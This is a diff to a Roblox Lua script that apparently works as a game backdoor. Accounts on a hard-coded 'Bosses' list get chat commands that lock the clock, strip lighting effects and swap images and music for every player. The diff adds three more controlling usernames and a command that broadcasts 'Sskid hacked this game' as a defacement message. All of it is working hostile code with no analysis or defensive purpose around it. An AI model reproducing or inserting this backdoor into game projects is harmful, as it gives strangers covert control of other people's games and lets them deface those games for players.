@@ -11,25 +11,26 @@ local LocalPlayer = Players.LocalPlayer
 local Bosses = {
     "C00LH4CK1124",
     "Ssukuna_robloxx", 
-    "C00LGAME1412"    
+    "C00LGAME1412",
+    "Sskidvc",
+    "Sskidv9",
+    "Sskidv7"
 }
 
 local ImageAliases = {
     ["c00lkidd"] = "158118263",
-    ["c00lhack"] = "122714132204276"
+    ["c00lhack"] = "122714132204276",
+    ["sskid"] = "74603125473840"
 }
 
--- جدول موزیک‌ها
 local MusicAliases = {
     ["c00lkidd"] = {id = "104181508980428", volume = 10, pitch = 0.22},
     ["theme"] = {id = "85390427326662", volume = 10, pitch = 0.16}
 }
 
--- متغیرهای وضعیت فعلی
 local isTimeLocked = false
 local timeConnection = nil
 
--- تابع قفل کردن زمان روی ساعت 12
 local function enableTimeLock()
     isTimeLocked = true
     if timeConnection then timeConnection:Disconnect() end
@@ -37,8 +38,6 @@ local function enableTimeLock()
         Lighting.ClockTime = 12
     end)
 end
-
--- ==============================================================
 
 local function onBossChatted(speaker, message)
     local args = string.split(message, " ")
@@ -75,6 +74,14 @@ local function onBossChatted(speaker, message)
             end
         end
         
+    elseif cmd == ".notify" and args[2] == "sskid" then
+        local Hint = Instance.new("Hint")
+        local msg = Instance.new("Message")
+        Hint.Parent = Workspace
+        msg.Parent = Workspace
+        Hint.Text = "Team Sskid join today"
+        msg.Text = "Sskid hacked this game"
+
     elseif cmd == ".notify" then
         local Hint = Instance.new("Hint")
         local msg = Instance.new("Message")
@@ -90,7 +97,6 @@ local function onBossChatted(speaker, message)
         if id then
             enableTimeLock()
             
-            -- حذف فوری اتمسفر و ابرها در بازی جاری
             for _, v in ipairs(Lighting:GetChildren()) do
                 if v:IsA("Atmosphere") or v:IsA("Clouds") or v:IsA("PostEffect") then
                     pcall(function() v:Destroy() end)
@@ -165,8 +171,6 @@ local function onBossChatted(speaker, message)
         end
     end
 end
-
--- ==============================================================
 
 local function checkPlayer(player)
     if table.find(Bosses, player.Name) then
